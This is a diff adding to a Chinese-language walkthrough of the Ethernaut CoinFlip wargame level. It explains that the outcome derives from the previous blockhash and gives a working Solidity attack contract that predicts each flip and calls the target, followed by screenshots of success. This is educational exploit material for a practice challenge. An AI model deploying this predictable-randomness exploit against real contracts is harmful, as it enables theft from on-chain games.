@@ -50,3 +50,50 @@
 <code>blockValue</code>的值为进行预测时当前区块的<code>blockhash</code>  
 因为<code>FACTOR</code>的值为常量，所以如果能提前预知<code>blockValue</code>的值，就能预测硬币的正反  
 因为有<code>if (lastHash == blockValue)</code>的判断，同一个区块的合约只能提交一次。所以我们采用合约调用的方法，先在我们编写的合约内计算硬币的正反，再调用本关合约，提交预测的结果  
+编写攻击合约代码  
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.6.0;
+
+    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol";
+
+
+    // 被调用合约接口
+    interface CoinFlipInterface {
+        function flip(bool _guess) external returns (bool);
+    }
+
+    // 攻击合约
+    contract CoinFlipAttack{
+
+        using SafeMath for uint256;
+        address private addr;
+        CoinFlipInterface cf_interface;
+
+        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+        constructor(address _addr) public {
+            addr = _addr;
+            //cf_ins = CoinFlip(_addr);
+            cf_interface = CoinFlipInterface(_addr);
+        }
+
+    // 使用本关合约相同代码计算硬币正反
+        function getSide() private view returns  (bool) {
+            uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+            uint256 coinFlip = blockValue.div(FACTOR);
+            bool side = coinFlip == 1 ? true : false;
+            return side;
+        }
+
+    // 调用接口实例
+        function attack() public {
+            bool side = getSide();
+            cf_interface.flip(side);
+        }
+
+    }
+
+查看预测结果，攻击成功  
+![图片](https://user-images.githubusercontent.com/35074461/196593086-7c9df5e9-68d1-4506-bbf0-8f0bca4cb16b.png)  
+继续提交直至成功10次，完成本关  
+![图片](https://user-images.githubusercontent.com/35074461/196594859-f4bf89a1-d10e-4ddb-a385-5b65c870b061.png)  
